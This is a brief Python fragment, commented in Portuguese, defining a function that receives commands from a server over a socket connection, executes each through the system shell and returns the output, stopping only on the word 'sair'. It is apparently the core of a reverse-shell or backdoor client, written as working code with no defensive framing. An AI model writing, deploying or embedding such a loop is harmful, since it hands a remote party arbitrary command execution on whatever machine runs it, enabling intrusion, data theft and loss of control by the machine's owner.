import subprocess

#função para receber instruções do servidor e executar comandos cmd
def executar_cmd(conn):
    while True:
            comando = conn.recv(1024).decode()
            if comando.lower() == "sair":
                break
            process = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            try:
                stdout, stderr = process.communicate(timeout=10)
                resultado = stdout + stderr

                if resultado == '':
                    resultado = 'comando executado sem retorno'
        
                conn.sendall(resultado.encode())

            except subprocess.TimeoutExpired:
                process.kill()
                conn.sendall("tempo excedido".encode())
